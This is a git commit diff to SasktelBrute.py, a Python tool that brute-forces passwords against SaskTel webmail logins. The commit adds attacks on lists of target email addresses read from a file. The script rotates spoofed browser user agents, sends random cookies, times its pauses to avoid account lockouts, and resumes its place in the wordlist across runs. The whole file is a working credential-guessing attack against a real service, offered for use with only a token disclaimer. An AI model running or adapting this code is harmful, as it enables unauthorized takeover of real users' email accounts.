1d01a5eaa3093465ddc5eed1427c16fdacd89d95
Derek Johnston <101991363+usethisname1419@users.noreply.github.com>
2023-09-30 12:36:54 -0600

    Update SasktelBrute.py
    included option to try users from a file

--- SasktelBrute.py
+++ SasktelBrute.py
@@ -5,36 +5,40 @@ import random
 import string
 from colorama import Fore, init
 
-init(autoreset=True)  # Automatically resets the color of printed text
+init(autoreset=True)
 
 USER_AGENTS = [
-     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/85.0.4183.121',  
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
 ]
 
 def current_timestamp():
-    return f"{Fore.YELLOW}{time.strftime('[%H:%M:%S]', time.localtime())}{Fore.RESET}"
+    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"
 
+def load_usernames_from_file(filename):
+    with open(filename, encoding='latin-1') as file:
+        return file.read().splitlines()
 
 def parse_arguments():
     parser = argparse.ArgumentParser(
         prog='SasktelBrute',
-        description='Bruteforce Sasktel Webmail. To prevent lockouts, this script will pause for 30 seconds every 10 attempts and pauses for 15 minutes each 49th attempt',
-        epilog='Use responsibly and ethically. I am not responsible for any misuse of this script!!')
+        description='Bruteforce Sasktel Webmail. Include lockout prevention.',
+        epilog='Use responsibly and ethically.')
 
     parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist")
-    parser.add_argument('-u', '--user', type=str, required=True, help="Full username including @sasktel.net")
-    args = parser.parse_args()
+    parser.add_argument('-u', '--user', type=str, help="Full username including @sasktel.net")
+    parser.add_argument('-U', '--userfile', type=str, help="File containing a list of email addresses of targets")
 
+    args = parser.parse_args()
+    if args.user and args.userfile:
+        parser.error("Specify either a single user with -u/--user or a file containing a list of users with -U/--userfile, not both.")
+
+    users = [args.user] if args.user else load_usernames_from_file(args.userfile)
     with open(args.wordlist, encoding='latin-1') as file:
         passwords = file.read().splitlines()
 
-    user = args.user
-
-    return user, passwords
+    return users, passwords
 
 def generate_random_cookie_part(length=48):
     characters = string.ascii_letters + string.digits + string.punctuation
@@ -60,10 +64,8 @@ def attack(user, password, user_agent):
         'Sec-Fetch-Site': 'same-origin'
     }
 
-  
     print(f"{Fore.YELLOW}User-Agent:{Fore.RESET} {user_agent}")
     print(f"{Fore.YELLOW}Cookie:{Fore.RESET} {cookie_value}")
- 
 
     data = {
         "SnapInfo": {
@@ -78,58 +80,83 @@ def attack(user, password, user_agent):
         "password": password
     }
 
-
     try:
         response = requests.post(url, json=data, headers=headers, timeout=10)
         if response.status_code == 400:
             print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.RED} {response.text}")
         elif response.status_code == 200:
             print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.GREEN} {response.text}")
-            if "PASSWORD FOUND" in response.text:
-                print(f"{current_timestamp()} PASSWORD FOUND: {Fore.BLUE}{password}")
-                return True
+        
+            print(f"{current_timestamp()} PASSWORD FOUND: {Fore.LIGHTBLUE_EX}{password}")
+            return True
     except requests.RequestException as e:
         print(f"{current_timestamp()}Error during request: {e}")
         return False
 
     return False
 
+
+def get_last_password_index():
+    try:
+        with open("last_password_index.txt", "r") as f:
+            return int(f.read().strip())
+    except:
+        return 0
+
+def set_last_password_index(index):
+    with open("last_password_index.txt", "w") as f:
+        f.write(str(index))
+
 if __name__ == '__main__':
-    user, passwords = parse_arguments()
+    users, passwords = parse_arguments()
 
-    print(f"{current_timestamp()} Starting the attack...")
+    print("Starting the attack...")
 
-    attempt_count = 1  # starting from 1 for easier modulo arithmetic
-    user_agent_index = 0  
+    user_agent_index = 0
+    password_limit = 10
+    attempt_count = 0
+    use_pause = len(users) == 1  # Add a condition to check the number of users
 
-    for password in passwords:
-        print(f"\n{current_timestamp()} Attempt #{attempt_count} - Trying password: {password}")
+    current_password_index = 0
 
-        current_user_agent = USER_AGENTS[user_agent_index]
-        user_agent_index = (user_agent_index + 1) % len(USER_AGENTS)
+    while current_password_index < len(passwords):
+        for user in users:
 
-        if attack(user, password, current_user_agent):
-            break
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.LIGHTBLUE_EX}Attacking user: {user}")
+            attempted_passwords = 0
 
-        time.sleep(2)
-        attempt_count += 1  
+            for i in range(current_password_index, current_password_index + password_limit):
+                if i >= len(passwords):
+                    break
 
-        if attempt_count % 49 == 0:
-            total_wait_time = 15 * 60  # 15 minutes in seconds
-            interval = 5 * 60  # 5 minutes in seconds
+                password = passwords[i]
+                print(f"\n{current_timestamp()} Attempt #{attempt_count} - Trying password:{Fore.YELLOW} {password}")
 
-            print(f"{current_timestamp()} Waiting for 15 minutes...")
-    
-            for elapsed_time in range(0, total_wait_time, interval):
-                time.sleep(interval)
-                remaining_minutes = (total_wait_time - elapsed_time) // 60
-                print(f"{current_timestamp()} {remaining_minutes} minutes remaining...")
+                current_user_agent = USER_AGENTS[user_agent_index]
+                user_agent_index = (user_agent_index + 1) % len(USER_AGENTS)
 
-            # Ensure we've waited the full duration
-            time.sleep(total_wait_time - elapsed_time - interval)
+                if attack(user, password, current_user_agent):
+                    break
 
-        elif attempt_count % 10 == 0:
-            print(f"{current_timestamp()} Waiting for 30 seconds...")
-            time.sleep(30)
+                time.sleep(2)
+                attempted_passwords += 1
+                attempt_count += 1
 
-    print(f"{current_timestamp()} Attack finished.")
+                if attempt_count % 49 == 0:
+
+
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Waiting for 15 minutes...")
+                    time.sleep(15*60)
+
+                elif attempt_count % 10 == 0 and use_pause:  # Modify this line
+
+
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Waiting for 30 seconds...")
+                    time.sleep(30)
+
+        current_password_index += password_limit
+
+    print("Attack finished.")
+
+
+
